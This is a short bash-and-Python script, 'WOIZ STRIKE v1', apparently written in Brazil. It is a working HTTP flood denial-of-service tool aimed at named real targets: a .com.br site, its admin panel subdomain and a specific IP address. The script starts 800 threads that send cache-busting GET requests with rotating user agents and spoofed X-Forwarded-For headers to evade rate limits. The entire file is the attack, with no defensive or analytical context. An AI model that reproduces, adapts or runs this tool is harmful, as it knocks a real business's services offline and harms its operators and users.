#!/bin/bash
# WOIZ STRIKE v1 - Daytona 8GB optimized | curl raw | opcao 1 = flood total
T1="woiz.com.br"; T2="painel.woiz.com.br"; T3="187.17.111.103"
echo "=== WOIZ STRIKE ==="
echo "[1] FLOOD TOTAL (site + painel + ip)"
echo "[2] FLOOD SITE apenas"
echo -n "opcao: "; read O
python3 -u - "$O" <<'PY'
import socket,ssl,threading,random,time,sys
O=sys.argv[1]
T=[("woiz.com.br",443,"woiz.com.br"),("painel.woiz.com.br",443,"painel.woiz.com.br"),("187.17.111.103",80,"painel.woiz.com.br")]
if O=="2": T=[T[0]]
UA=["Mozilla/5.0 (Windows NT 10.0; Win64; x64)","Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)","Mozilla/5.0 (Linux; Android 13)"]
ok=[0]
def w(h,p,host):
 while True:
  try:
   s=socket.socket();s.settimeout(6)
   if p==443:
    import ssl as _s;c=_s.create_default_context();s=c.wrap_socket(s,server_hostname=h)
   s.connect((h,p))
   q=''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789')for _ in range(10))
   ua=random.choice(UA)
   ip=f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
   req=f"GET /?{q}={q} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nX-Forwarded-For: {ip}\r\nCache-Control: no-cache\r\nConnection: close\r\n\r\n"
   s.send(req.encode());s.recv(1024);s.close();ok[0]+=1
  except: time.sleep(0.2)
N=800  # 8GB aguenta 800 threads
ts=[]
for h,p,host in T:
 for _ in range(N//len(T)):ts.append(threading.Thread(target=w,args=(h,p,host),daemon=True))
[t.start() for t in ts]
print(f"[*] FLOODANDO {len(ts)} threads...",flush=True)
t0=time.time()
while True:
 time.sleep(5);print(f"[+] {int(time.time()-t0)}s req_ok={ok[0]}",flush=True)
PY
